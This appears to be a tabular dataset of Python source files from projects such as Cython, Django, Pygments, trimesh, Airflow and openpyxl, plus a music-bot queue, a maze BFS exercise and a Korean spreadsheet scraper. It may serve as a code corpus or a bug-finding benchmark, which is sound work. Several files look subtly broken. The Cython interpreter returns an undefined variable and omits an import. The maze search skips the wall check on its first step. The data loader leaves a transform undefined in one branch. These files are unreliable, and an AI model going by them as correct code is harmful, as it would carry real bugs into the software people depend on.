            pattern = self.distribution.get_name() + ""*"" + pattern
            files = glob(os.path.join(self.dist_dir, pattern))
            files = [(os.path.getmtime(f), f) for f in files]
            files.sort()
            files.reverse()

            log.info(""%d file(s) matching %s"", len(files), pattern)
            files = files[self.keep :]
            for t, f in files:
                log.info(""Deleting %s"", f)
                if not self.dry_run:
                    if os.path.isdir(f):
                        shutil.rmtree(f)
                    else:
                        os.unlink(f)"
JD225	JD225-Interpreter.py	"""""""
This module deals with interpreting the parse tree as Python
would have done, in the compiler.

For now this only covers parse tree to value conversion of
compile-time values.
""""""

from __future__ import absolute_import

from .Nodes import *
from .ExprNodes import *
from .Errors import CompileError


class EmptyScope(object):
    def lookup(self, name):
        return None

empty_scope = EmptyScope()

def interpret_compiletime_options(optlist, optdict, type_env=None, type_args=()):
    """"""
    Tries to interpret a list of compile time option nodes.
    The result will be a tuple (optlist, optdict) but where
    all expression nodes have been interpreted. The result is
    in the form of tuples (value, pos).

    optlist is a list of nodes, while optdict is a DictNode (the
    result optdict is a dict)

    If type_env is set, all type nodes will be analysed and the resulting
    type set. Otherwise only interpretateable ExprNodes
    are allowed, other nodes raises errors.

    A CompileError will be raised if there are problems.
    """"""

    def interpret(node, ix):
        if ix in type_args:
            if type_env:
                type = node.analyse_as_type(type_env)
                if not type:
                    raise CompileError(node.pos, ""Invalid type."")
                return (type, node.pos)
            else:
                raise CompileError(node.pos, ""Type not allowed here."")
        else:
            if (sys.version_info[0] >=3 and
                isinstance(node, StringNode) and
                node.unicode_value is not None):
                return (node.unicode_value, node.pos)
            return (node.compile_time_value(empty_scope), node.pos)

    if optlist:
        optlist = [interpret(x, ix) for ix, x in enumerate(optlist)]
    if optdict:
        assert isinstance(optdict, DictNode)
        new_optdict = {}
        for item in optdict.key_value_pairs:
            new_key, dummy = interpret(item.key, None)
            new_optdict[new_key] = interpret(item.value, item.key.value)
        optdict = new_optdict
    return (optlist, new_optdict)"
JY103	JY103-safestring.py	"""""""
Functions for working with ""safe strings"": strings that can be displayed safely
without further escaping in HTML. Marking something as a ""safe string"" means
that the producer of the string has already turned characters that should not
be interpreted by the HTML engine (e.g. '<') into the appropriate entities.
""""""

from functools import wraps

from django.utils.functional import keep_lazy


class SafeData:
    __slots__ = ()

    def __html__(self):
        """"""
        Return the html representation of a string for interoperability.

        This allows other template engines to understand Django's SafeData.
        """"""
        return self


class SafeString(str, SafeData):
    """"""
    A str subclass that has been specifically marked as ""safe"" for HTML output
    purposes.
    """"""

    __slots__ = ()

    def __add__(self, rhs):
        """"""
        Concatenating a safe string with another safe bytestring or
        safe string is safe. Otherwise, the result is no longer safe.
        """"""
        t = super().__add__(rhs)
        if isinstance(rhs, SafeData):
            return SafeString(t)
        return t

    def __str__(self):
        return self


SafeText = SafeString  # For backwards compatibility since Django 2.0.


def _safety_decorator(safety_marker, func):
    @wraps(func)
    def wrapped(*args, **kwargs):
        return safety_marker(func(*args, **kwargs))

    return wrapped


@keep_lazy(SafeString)
def mark_safe(s):
    """"""
    Explicitly mark a string as safe for (HTML) output purposes. The returned
    object can be used everywhere a string is appropriate.

    If used on a method as a decorator, mark the returned data as safe.

    Can be called multiple times on a single string.
    """"""
    if hasattr(s, ""__html__""):
        return s
    if callable(s):
        return _safety_decorator(mark_safe, s)
    return SafeString(s)"
JD419	JD419-queue.py	"from typing import Union

from config import autoclean, chatstats, userstats
from config.config import time_to_seconds
from ShizukaXMusic.misc import db


async def put_queue(
    chat_id,
    original_chat_id,
    file,
    title,
    duration,
    user,
    vidid,
    user_id,
    stream,
    forceplay: Union[bool, str] = None,
):
    title = title.title()
    try:
        duration_in_seconds = time_to_seconds(duration) - 3
    except:
        duration_in_seconds = 0
    put = {
        ""title"": title,
        ""dur"": duration,
        ""streamtype"": stream,
        ""by"": user,
        ""chat_id"": original_chat_id,
        ""file"": file,
        ""vidid"": vidid,
        ""seconds"": duration_in_seconds,
        ""played"": 0,
    }
    if forceplay:
        check = db.get(chat_id)
        if check:
            check.insert(0, put)
        else:
            db[chat_id] = []
            db[chat_id].append(put)
    else:
        db[chat_id].append(put)
    autoclean.append(file)
    vidid = ""telegram"" if vidid == ""soundcloud"" else vidid
    to_append = {""vidid"": vidid, ""title"": title}
    if chat_id not in chatstats:
        chatstats[chat_id] = []
    chatstats[chat_id].append(to_append)
    if user_id not in userstats:
        userstats[user_id] = []
    userstats[user_id].append(to_append)
    return


async def put_queue_index(
    chat_id,
    original_chat_id,
    file,
    title,
    duration,
    user,
    vidid,
    stream,
    forceplay: Union[bool, str] = None,
):
    put = {
        ""title"": title,
        ""dur"": duration,
        ""streamtype"": stream,
        ""by"": user,
        ""chat_id"": original_chat_id,
        ""file"": file,
        ""vidid"": vidid,
        ""seconds"": 0,
        ""played"": 0,
    }
    if forceplay:
        check = db.get(chat_id)
        if check:
            check.insert(0, put)
        else:
            db[chat_id] = []
            db[chat_id].append(put)
    else:
        db[chat_id].append(put)"
JD201	JD201-x10.py	"""""""
    pygments.lexers.x10
    ~~~~~~~~~~~~~~~~~~~

    Lexers for the X10 programming language.

    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.
""""""

from pygments.lexer import RegexLexer
from pygments.token import Text, Comment, Keyword, String

__all__ = ['X10Lexer']


class X10Lexer(RegexLexer):
    """"""
    For the X10 language.

    .. versionadded:: 2.2
    """"""

    name = 'X10'
    url = 'http://x10-lang.org/'
    aliases = ['x10', 'xten']
    filenames = ['*.x10']
    mimetypes = ['text/x-x10']

    keywords = (
        'as', 'assert', 'async', 'at', 'athome', 'ateach', 'atomic',
        'break', 'case', 'catch', 'class', 'clocked', 'continue',
        'def', 'default', 'do', 'else', 'final', 'finally', 'finish',
        'for', 'goto', 'haszero', 'here', 'if', 'import', 'in',
        'instanceof', 'interface', 'isref', 'new', 'offer',
        'operator', 'package', 'return', 'struct', 'switch', 'throw',
        'try', 'type', 'val', 'var', 'when', 'while'
    )

    types = (
        'void'
    )

    values = (
        'false', 'null', 'self', 'super', 'this', 'true'
    )

    modifiers = (
        'abstract', 'extends', 'implements', 'native', 'offers',
        'private', 'property', 'protected', 'public', 'static',
        'throws', 'transient'
    )

    tokens = {
        'root': [
            (r'[^\S\n]+', Text),
            (r'//.*?\n', Comment.Single),
            (r'/\*(.|\n)*?\*/', Comment.Multiline),
            (r'\b(%s)\b' % '|'.join(keywords), Keyword),
            (r'\b(%s)\b' % '|'.join(types), Keyword.Type),
            (r'\b(%s)\b' % '|'.join(values), Keyword.Constant),
            (r'\b(%s)\b' % '|'.join(modifiers), Keyword.Declaration),
            (r'""(\\\\|\\[^\\]|[^""\\])*""', String),
            (r""'\\.'|'[^\\]'|'\\u[0-9a-fA-F]{4}'"", String.Char),
            (r'.', Text)
        ],
    }"
JD441	JD441-services_config.py	"# Copyright 2016 Google LLC.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import os

# To add services insert key value pair of the name of the service and
# the port you want it to run on when running locally
SERVICES = {
    'default': 8000,
    'static': 8001
}


def init_app(app):
    # The GAE_INSTANCE environment variable will be set when deployed to GAE.
    gae_instance = os.environ.get(
        'GAE_INSTANCE', os.environ.get('GAE_MODULE_INSTANCE'))
    environment = 'production' if gae_instance is not None else 'development'
    app.config['SERVICE_MAP'] = map_services(environment)


def map_services(environment):
    """"""Generates a map of services to correct urls for running locally
    or when deployed.""""""
    url_map = {}
    for service, local_port in SERVICES.items():
        if environment == 'production':
            url_map[service] = production_url(service)
        if environment == 'development':
            url_map[service] = local_url(local_port)
    return url_map


def production_url(service_name):
    """"""Generates url for a service when deployed to App Engine.""""""
    project_id = os.getenv('GOOGLE_CLOUD_PROJECT')
    project_url = '{}.appspot.com'.format(project_id)
    if service_name == 'default':
        return 'https://{}'.format(project_url)
    else:
        return 'https://{}-dot-{}'.format(service_name, project_url)


def local_url(port):
    """"""Generates url for a service when running locally""""""
    return 'http://localhost:{}'.format(str(port))"
JY203	JY203-vhacd.py	"import os
import platform

from .generic import MeshScript
from ..constants import log

from distutils.spawn import find_executable

_search_path = os.environ['PATH']
if platform.system() == 'Windows':
    # split existing path by delimiter
    _search_path = [i for i in _search_path.split(';') if len(i) > 0]
    _search_path.append(r'C:\Program Files')
    _search_path.append(r'C:\Program Files (x86)')
    _search_path = ';'.join(_search_path)
    log.debug('searching for vhacd in: %s', _search_path)


_vhacd_executable = None
for _name in ['vhacd', 'testVHACD']:
    _vhacd_executable = find_executable(_name, path=_search_path)
    if _vhacd_executable is not None:
        break

exists = _vhacd_executable is not None


def convex_decomposition(mesh, debug=False, **kwargs):
    """"""
    Run VHACD to generate an approximate convex decomposition
    of a single mesh.

    Parameters
    --------------
    mesh : trimesh.Trimesh
      Mesh to be decomposed into convex components

    Returns
    ------------
    meshes : (n,) trimesh.Trimesh
      List of convex meshes
    """"""
    if not exists:
        raise ValueError('No vhacd available!')

    argstring = ' --input $MESH_0 --output $MESH_POST --log $SCRIPT'

    # pass through extra arguments from the input dictionary
    for key, value in kwargs.items():
        argstring += ' --{} {}'.format(str(key),
                                       str(value))

    with MeshScript(meshes=[mesh],
                    script='',
                    exchange='obj',
                    group_material=False,
                    split_object=True,
                    debug=debug) as vhacd:
        result = vhacd.run(_vhacd_executable + argstring)

    # if we got a scene back return a list of meshes
    if hasattr(result, 'geometry') and isinstance(result.geometry, dict):
        return list(result.geometry.values())

    return result"
JD212	JD212-extraction_xlsx_data.py	"import wget
import os
import function.find_requirement_post_url as find_urls
import function.find_xlsx as find_xlsx
import function.download_xlsx_file as download_xlsx


MOUNTH = '3월'
PARSE_XLSX_SELECTOR = 'section#bo_v_file'
PARSE_NAME_SELECTOR = 'section#bo_v_info'
PAGE = ['1', '2', '3']
# 광주학교급식청렴홍보협의회 공산품 검색어 총이라고 검색했을시 url
url_total = ""http://school062.com/bbs/board.php?bo_table=product_01&sfl=wr_subject&stx=%EC%B4%9D&sop=and&page={}""

# < '총'(총단가표) 이라는 키워드에 나오진 않지만 꼭 필요한 메인브랜드 데이터들 > --> 임의로 추가
# 메인브랜드만 가져오는 것은 페이지네이션 필요 x

# 청정원 추가 --> 키워드 : 청정원
url_daesang = ""http://school062.com/bbs/board.php?bo_table=product_01&sca=&sop=and&sfl=wr_subject&stx=%EC%B2%AD%EC%A0%95%EC%9B%90""
# 오뚜기 추가 --> 키워드 : 오뚜기
url_ottogi = ""http://school062.com/bbs/board.php?bo_table=product_01&sca=&sop=and&sfl=wr_subject&stx=%EC%98%A4%EB%9A%9C%EA%B8%B0""

parse_url_list = [url_total, url_daesang, url_ottogi]

DOWNLOAD_PATH = '/Users/antoliny/intelligent_owl_givenrat/product_data/excel_files'



if __name__ == ""__main__"":

  # 특정 월에 해당하는 공산품 엑셀파일이 담긴 포스트 주소 가져오기
  user_set_mounth_urls = find_urls.rounds_post(parse_url_list, MOUNTH, PAGE)
  # 포스트에 있는 엑셀파일 주소들을 가져오기
  xlsx_data = find_xlsx.make_xlsx_files_list()
  xlsx_files = xlsx_data(user_set_mounth_urls, PARSE_XLSX_SELECTOR)
  xlsx_names = xlsx_data(user_set_mounth_urls, PARSE_NAME_SELECTOR)
  
  # xlsx_names 수정이 필요함
  data = list(zip(xlsx_files, xlsx_names))

  os.chdir(DOWNLOAD_PATH)
  # 리스트에 들어있는 엑셀파일들을 내 디렉터리에 추가 하기
  
  for xlsx_url, name in data:
    wget.download(xlsx_url, f'{name} {MOUNTH} 공산품 데이터.xlsx', bar=download_xlsx.bar_custom)
  








"
JD300	JD300-mixins.py	"from django.core import checks

NOT_PROVIDED = object()


class FieldCacheMixin:
    """"""Provide an API for working with the model's fields value cache.""""""

    def get_cache_name(self):
        raise NotImplementedError

    def get_cached_value(self, instance, default=NOT_PROVIDED):
        cache_name = self.get_cache_name()
        try:
            return instance._state.fields_cache[cache_name]
        except KeyError:
            if default is NOT_PROVIDED:
                raise
            return default

    def is_cached(self, instance):
        return self.get_cache_name() in instance._state.fields_cache

    def set_cached_value(self, instance, value):
        instance._state.fields_cache[self.get_cache_name()] = value

    def delete_cached_value(self, instance):
        del instance._state.fields_cache[self.get_cache_name()]


class CheckFieldDefaultMixin:
    _default_hint = (""<valid default>"", ""<invalid default>"")

    def _check_default(self):
        if (
            self.has_default()
            and self.default is not None
            and not callable(self.default)
        ):
            return [
                checks.Warning(
                    ""%s default should be a callable instead of an instance ""
                    ""so that it's not shared between all field instances.""
                    % (self.__class__.__name__,),
                    hint=(
                        ""Use a callable instead, e.g., use `%s` instead of ""
                        ""`%s`."" % self._default_hint
                    ),
                    obj=self,
                    id=""fields.E010"",
                )
            ]
        else:
            return []

    def check(self, **kwargs):
        errors = super().check(**kwargs)
        errors.extend(self._check_default())
        return errors"
JD420	JD420-data_loader.py	"# CMU 16-726 Learning-Based Image Synthesis / Spring 2023, Assignment 3
# The code base is based on the great work from CSC 321, U Toronto
# https://www.cs.toronto.edu/~rgrosse/courses/csc321_2018/assignments/a4-code.zip

import glob
import os

import PIL.Image as Image
from torch.utils.data import DataLoader, Dataset
from torchvision import transforms


class CustomDataSet(Dataset):
    """"""Load images under folders""""""
    def __init__(self, main_dir, ext='*.png', transform=None):
        self.main_dir = main_dir
        self.transform = transform
        all_imgs = glob.glob(os.path.join(main_dir, ext))
        self.total_imgs = all_imgs
        print(os.path.join(main_dir, ext))
        print(len(self))

    def __len__(self):
        return len(self.total_imgs)

    def __getitem__(self, idx):
        img_loc = self.total_imgs[idx]
        image = Image.open(img_loc).convert(""RGB"")
        tensor_image = self.transform(image)
        return tensor_image


def get_data_loader(data_path, opts):
    """"""Create training and test data loaders.""""""
    basic_transform = transforms.Compose([
        transforms.Resize(opts.image_size, Image.BICUBIC),
        transforms.ToTensor(),
        transforms.Normalize((0.5, 0.5, 0.5), (0.5, 0.5, 0.5)),
    ])

    if opts.data_preprocess == 'basic':
        train_transform = basic_transform
    elif opts.data_preprocess == 'deluxe':
        # todo: add your code here: below are some ideas for your reference
        # load_size = int(1.1 * opts.image_size)
        # osize = [load_size, load_size]
        # transforms.Resize(osize, Image.BICUBIC)
        # transforms.RandomCrop(opts.image_size)
        # transforms.RandomHorizontalFlip()
        pass

    dataset = CustomDataSet(
        os.path.join('data/', data_path), opts.ext, train_transform
    )
    dloader = DataLoader(
        dataset=dataset, batch_size=opts.batch_size,
        shuffle=True, num_workers=opts.num_workers
    )

    return dloader"
JD427	JD427-490. The Maze(二维BFS).py	"""""""
在迷宫中有一个球，里面有空的空间和墙壁。球可以通过滚上，下，左或右移动，
但它不会停止滚动直到撞到墙上。当球停止时，它可以选择下一个方向。

给定球的起始位置，目的地和迷宫，确定球是否可以停在终点。

迷宫由二维数组表示。1表示墙和0表示空的空间。你可以假设迷宫的边界都是墙。开始和目标坐标用行和列索引表示。

map =
[
 [0,0,1,0,0],
 [0,0,0,0,0],
 [0,0,0,1,0],
 [1,1,0,1,1],
 [0,0,0,0,0]
]
start = [0,4]
end = [3,2]
输出:
false

对应lintcode787
""""""

class Solution:
    """"""
    @param maze: the maze
    @param start: the start
    @param destination: the destination
    @return: whether the ball could stop at the destination
    """"""

    def has_path(self, maze: List[List[int]], start: List[int], destination: List[int]) -> bool:
        dirs = [[0, 1], [0, -1], [-1, 0], [1, 0]]
        visited = []
        q = [start]
        visited.append(start)

        while len(q) > 0:
            cur = q.pop(0)
            if cur == destination:
                return True

            for di, dj in dirs:
                ni = cur[0] + di
                nj = cur[1] + dj

                # 重点在这里，因为我们需要往一个方向走到底，就是得走到边界或撞墙才能停
                while 0 <= ni + di < len(maze) and 0 <= nj + dj < len(maze[0]) and maze[ni+di][nj+dj] == 0:
                    ni += di
                    nj += dj

                np = [ni, nj]
                # 假如没走过，则记录这个结果，并往下一个方向走
                if np not in visited:
                    q.append(np)
                    visited.append(np)

        return False

""""""
古城算法 30:00
https://www.bilibili.com/video/BV1Rz4j1Z7tJ/?spm_id_from=333.337.search-card.all.click&vd_source=b81616a45fd239becaebfee25e0dbd35
"""""""
JY226	JY226-test_bigquery_to_mysql.py	"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.
from __future__ import annotations

from unittest import mock

from airflow.providers.google.cloud.transfers.bigquery_to_mysql import BigQueryToMySqlOperator

TASK_ID = ""test-bq-create-table-operator""
TEST_DATASET = ""test-dataset""
TEST_TABLE_ID = ""test-table-id""
TEST_DAG_ID = ""test-bigquery-operators""


class TestBigQueryToMySqlOperator:
    @mock.patch(""airflow.providers.google.cloud.transfers.bigquery_to_mysql.BigQueryHook"")
    def test_execute_good_request_to_bq(self, mock_hook):
        destination_table = ""table""
        operator = BigQueryToMySqlOperator(
            task_id=TASK_ID,
            dataset_table=f""{TEST_DATASET}.{TEST_TABLE_ID}"",
            mysql_table=destination_table,
            replace=False,
        )

        operator.execute(None)
        # fmt: off
        mock_hook.return_value.list_rows.assert_called_once_with(
            dataset_id=TEST_DATASET,
            table_id=TEST_TABLE_ID,
            max_results=1000,
            selected_fields=None,
            start_index=0,
        )
        # fmt: on"
JY248	JY248-ninja_test.py	"#!/usr/bin/env python3

# Copyright (c) 2012 Google Inc. All rights reserved.
# Use of this source code is governed by a BSD-style license that can be
# found in the LICENSE file.

"""""" Unit tests for the ninja.py file. """"""

import sys
import unittest

import gyp.generator.ninja as ninja


class TestPrefixesAndSuffixes(unittest.TestCase):
    def test_BinaryNamesWindows(self):
        # These cannot run on non-Windows as they require a VS installation to
        # correctly handle variable expansion.
        if sys.platform.startswith(""win""):
            writer = ninja.NinjaWriter(
                ""foo"", ""wee"", ""."", ""."", ""build.ninja"", ""."", ""build.ninja"", ""win""
            )
            spec = {""target_name"": ""wee""}
            self.assertTrue(
                writer.ComputeOutputFileName(spec, ""executable"").endswith("".exe"")
            )
            self.assertTrue(
                writer.ComputeOutputFileName(spec, ""shared_library"").endswith("".dll"")
            )
            self.assertTrue(
                writer.ComputeOutputFileName(spec, ""static_library"").endswith("".lib"")
            )

    def test_BinaryNamesLinux(self):
        writer = ninja.NinjaWriter(
            ""foo"", ""wee"", ""."", ""."", ""build.ninja"", ""."", ""build.ninja"", ""linux""
        )
        spec = {""target_name"": ""wee""}
        self.assertTrue(""."" not in writer.ComputeOutputFileName(spec, ""executable""))
        self.assertTrue(
            writer.ComputeOutputFileName(spec, ""shared_library"").startswith(""lib"")
        )
        self.assertTrue(
            writer.ComputeOutputFileName(spec, ""static_library"").startswith(""lib"")
        )
        self.assertTrue(
            writer.ComputeOutputFileName(spec, ""shared_library"").endswith("".so"")
        )
        self.assertTrue(
            writer.ComputeOutputFileName(spec, ""static_library"").endswith("".a"")
        )


if __name__ == ""__main__"":
    unittest.main()"
JY376	JY376-pdf.py	"# -*- coding: utf-8 -*-

# Copyright 2010 Dirk Holtwick, holtwick.it
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import six
import logging


from xhtml2pdf.util import pisaTempFile, getFile, PyPDF2


log = logging.getLogger(""xhtml2pdf"")


class pisaPDF:
    def __init__(self, capacity=-1):
        self.capacity = capacity
        self.files = []

    def addFromURI(self, url, basepath=None):
        obj = getFile(url, basepath)
        if obj and (not obj.notFound()):
            self.files.append(obj.getFile())

    addFromFileName = addFromURI

    def addFromFile(self, f):
        if hasattr(f, ""read""):
            self.files.append(f)
        else:
            self.addFromURI(f)

    def addFromString(self, data):
        self.files.append(pisaTempFile(data, capacity=self.capacity))

    def addDocument(self, doc):
        if hasattr(doc.dest, ""read""):
            self.files.append(doc.dest)

    def join(self, file=None):
        output = PyPDF2.PdfFileWriter()
        for pdffile in self.files:
            input = PyPDF2.PdfFileReader(pdffile)
            for pageNumber in six.moves.range(input.getNumPages()):
                output.addPage(input.getPage(pageNumber))

        if file is not None:
            output.write(file)
            return file
        out = pisaTempFile(capacity=self.capacity)
        output.write(out)
        return out.getvalue()

    getvalue = join
    __str__ = join"
JY386	JY386-checker_test_case.py	"# Licensed under the GPL: https://www.gnu.org/licenses/old-licenses/gpl-2.0.html
# For details: https://github.com/PyCQA/pylint/blob/main/LICENSE

import contextlib
from typing import Dict, Optional, Type

from pylint.testutils.global_test_linter import linter
from pylint.testutils.unittest_linter import UnittestLinter
from pylint.utils import ASTWalker


class CheckerTestCase:
    """"""A base testcase class for unit testing individual checker classes.""""""

    CHECKER_CLASS: Optional[Type] = None
    CONFIG: Dict = {}

    def setup_method(self):
        self.linter = UnittestLinter()
        self.checker = self.CHECKER_CLASS(self.linter)  # pylint: disable=not-callable
        for key, value in self.CONFIG.items():
            setattr(self.checker.config, key, value)
        self.checker.open()

    @contextlib.contextmanager
    def assertNoMessages(self):
        """"""Assert that no messages are added by the given method.""""""
        with self.assertAddsMessages():
            yield

    @contextlib.contextmanager
    def assertAddsMessages(self, *messages):
        """"""Assert that exactly the given method adds the given messages.

        The list of messages must exactly match *all* the messages added by the
        method. Additionally, we check to see whether the args in each message can
        actually be substituted into the message string.
        """"""
        yield
        got = self.linter.release_messages()
        no_msg = ""No message.""
        expected = ""\n"".join(repr(m) for m in messages) or no_msg
        got_str = ""\n"".join(repr(m) for m in got) or no_msg
        msg = (
            ""Expected messages did not match actual.\n""
            f""\nExpected:\n{expected}\n\nGot:\n{got_str}\n""
        )
        assert got == list(messages), msg

    def walk(self, node):
        """"""recursive walk on the given node""""""
        walker = ASTWalker(linter)
        walker.add_checker(self.checker)
        walker.walk(node)"
JD442	JD442-translate_create_dataset.py	"# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.


def create_dataset(project_id, display_name):
    """"""Create a dataset.""""""
    # [START automl_translate_create_dataset]
    from google.cloud import automl

    # TODO(developer): Uncomment and set the following variables
    # project_id = ""YOUR_PROJECT_ID""
    # display_name = ""YOUR_DATASET_NAME""

    client = automl.AutoMlClient()

    # A resource that represents Google Cloud Platform location.
    project_location = f""projects/{project_id}/locations/us-central1""
    # For a list of supported languages, see:
    # https://cloud.google.com/translate/automl/docs/languages
    dataset_metadata = automl.TranslationDatasetMetadata(
        source_language_code=""en"", target_language_code=""ja""
    )
    dataset = automl.Dataset(
        display_name=display_name,
        translation_dataset_metadata=dataset_metadata,
    )

    # Create a dataset with the dataset metadata in the region.
    response = client.create_dataset(parent=project_location, dataset=dataset)

    created_dataset = response.result()

    # Display the dataset information
    print(""Dataset name: {}"".format(created_dataset.name))
    print(""Dataset id: {}"".format(created_dataset.name.split(""/"")[-1]))
    # [END automl_translate_create_dataset]"
JD238	JD238-_arrow_utils.py	"from __future__ import annotations

import warnings

import numpy as np
import pyarrow

from pandas.errors import PerformanceWarning
from pandas.util._exceptions import find_stack_level


def fallback_performancewarning(version: str | None = None) -> None:
    """"""
    Raise a PerformanceWarning for falling back to ExtensionArray's
    non-pyarrow method
    """"""
    msg = ""Falling back on a non-pyarrow code path which may decrease performance.""
    if version is not None:
        msg += f"" Upgrade to pyarrow >={version} to possibly suppress this warning.""
    warnings.warn(msg, PerformanceWarning, stacklevel=find_stack_level())


def pyarrow_array_to_numpy_and_mask(
    arr, dtype: np.dtype
) -> tuple[np.ndarray, np.ndarray]:
    """"""
    Convert a primitive pyarrow.Array to a numpy array and boolean mask based
    on the buffers of the Array.

    At the moment pyarrow.BooleanArray is not supported.

    Parameters
    ----------
    arr : pyarrow.Array
    dtype : numpy.dtype

    Returns
    -------
    (data, mask)
        Tuple of two numpy arrays with the raw data (with specified dtype) and
        a boolean mask (validity mask, so False means missing)
    """"""
    dtype = np.dtype(dtype)

    buflist = arr.buffers()
    # Since Arrow buffers might contain padding and the data might be offset,
    # the buffer gets sliced here before handing it to numpy.
    # See also https://github.com/pandas-dev/pandas/issues/40896
    offset = arr.offset * dtype.itemsize
    length = len(arr) * dtype.itemsize
    data_buf = buflist[1][offset : offset + length]
    data = np.frombuffer(data_buf, dtype=dtype)
    bitmask = buflist[0]
    if bitmask is not None:
        mask = pyarrow.BooleanArray.from_buffers(
            pyarrow.bool_(), len(arr), [None, bitmask], offset=arr.offset
        )
        mask = np.asarray(mask)
    else:
        mask = np.ones(len(arr), dtype=bool)
    return data, mask"
JY133	JY133-formats.py	"# This file is distributed under the same license as the Django package.
#
# The *_FORMAT strings use the Django date format syntax,
# see https://docs.djangoproject.com/en/dev/ref/templates/builtins/#date
DATE_FORMAT = 'j. F Y.'
TIME_FORMAT = 'H:i'
DATETIME_FORMAT = 'j. F Y. H:i'
YEAR_MONTH_FORMAT = 'F Y.'
MONTH_DAY_FORMAT = 'j. F'
SHORT_DATE_FORMAT = 'j.m.Y.'
SHORT_DATETIME_FORMAT = 'j.m.Y. H:i'
FIRST_DAY_OF_WEEK = 1

# The *_INPUT_FORMATS strings use the Python strftime format syntax,
# see https://docs.python.org/library/datetime.html#strftime-strptime-behavior
DATE_INPUT_FORMATS = [
    '%d.%m.%Y.', '%d.%m.%y.',       # '25.10.2006.', '25.10.06.'
    '%d. %m. %Y.', '%d. %m. %y.',   # '25. 10. 2006.', '25. 10. 06.'
    # '%d. %b %y.', '%d. %B %y.',     # '25. Oct 06.', '25. October 06.'
    # '%d. %b \'%y.', '%d. %B \'%y.', # '25. Oct '06.', '25. October '06.'
    # '%d. %b %Y.', '%d. %B %Y.',     # '25. Oct 2006.', '25. October 2006.'
]
DATETIME_INPUT_FORMATS = [
    '%d.%m.%Y. %H:%M:%S',       # '25.10.2006. 14:30:59'
    '%d.%m.%Y. %H:%M:%S.%f',    # '25.10.2006. 14:30:59.000200'
    '%d.%m.%Y. %H:%M',          # '25.10.2006. 14:30'
    '%d.%m.%y. %H:%M:%S',       # '25.10.06. 14:30:59'
    '%d.%m.%y. %H:%M:%S.%f',    # '25.10.06. 14:30:59.000200'
    '%d.%m.%y. %H:%M',          # '25.10.06. 14:30'
    '%d. %m. %Y. %H:%M:%S',     # '25. 10. 2006. 14:30:59'
    '%d. %m. %Y. %H:%M:%S.%f',  # '25. 10. 2006. 14:30:59.000200'
    '%d. %m. %Y. %H:%M',        # '25. 10. 2006. 14:30'
    '%d. %m. %y. %H:%M:%S',     # '25. 10. 06. 14:30:59'
    '%d. %m. %y. %H:%M:%S.%f',  # '25. 10. 06. 14:30:59.000200'
    '%d. %m. %y. %H:%M',        # '25. 10. 06. 14:30'
]
DECIMAL_SEPARATOR = ','
THOUSAND_SEPARATOR = '.'
NUMBER_GROUPING = 3"
JY424	JY424-functions.py	"# Copyright (c) 2010-2021 openpyxl

""""""
XML compatability functions
""""""

# Python stdlib imports
import re
from functools import partial

from openpyxl import DEFUSEDXML, LXML

if LXML is True:
    from lxml.etree import (
    Element,
    SubElement,
    register_namespace,
    QName,
    xmlfile,
    XMLParser,
    )
    from lxml.etree import fromstring, tostring
    # do not resolve entities
    safe_parser = XMLParser(resolve_entities=False)
    fromstring = partial(fromstring, parser=safe_parser)

else:
    from xml.etree.ElementTree import (
    Element,
    SubElement,
    fromstring,
    tostring,
    QName,
    register_namespace
    )
    from et_xmlfile import xmlfile
    if DEFUSEDXML is True:
        from defusedxml.ElementTree import fromstring

from xml.etree.ElementTree import iterparse
if DEFUSEDXML is True:
    from defusedxml.ElementTree import iterparse

from openpyxl.xml.constants import (
    CHART_NS,
    DRAWING_NS,
    SHEET_DRAWING_NS,
    CHART_DRAWING_NS,
    SHEET_MAIN_NS,
    REL_NS,
    VTYPES_NS,
    COREPROPS_NS,
    DCTERMS_NS,
    DCTERMS_PREFIX,
    XML_NS
)

register_namespace(DCTERMS_PREFIX, DCTERMS_NS)
register_namespace('dcmitype', 'http://purl.org/dc/dcmitype/')
register_namespace('cp', COREPROPS_NS)
register_namespace('c', CHART_NS)
register_namespace('a', DRAWING_NS)
register_namespace('s', SHEET_MAIN_NS)
register_namespace('r', REL_NS)
register_namespace('vt', VTYPES_NS)
register_namespace('xdr', SHEET_DRAWING_NS)
register_namespace('cdr', CHART_DRAWING_NS)
register_namespace('xml', XML_NS)


tostring = partial(tostring, encoding=""utf-8"")

NS_REGEX = re.compile(""({(?P<namespace>.*)})?(?P<localname>.*)"")

def localname(node):
    if callable(node.tag):
        return ""comment""
    m = NS_REGEX.match(node.tag)
    return m.group('localname')


def whitespace(node):
    if node.text != node.text.strip():
        node.set(""{%s}space"" % XML_NS, ""preserve"")"
JD35	JD35-cp949prober.py	"######################## BEGIN LICENSE BLOCK ########################
# The Original Code is mozilla.org code.
#
# The Initial Developer of the Original Code is
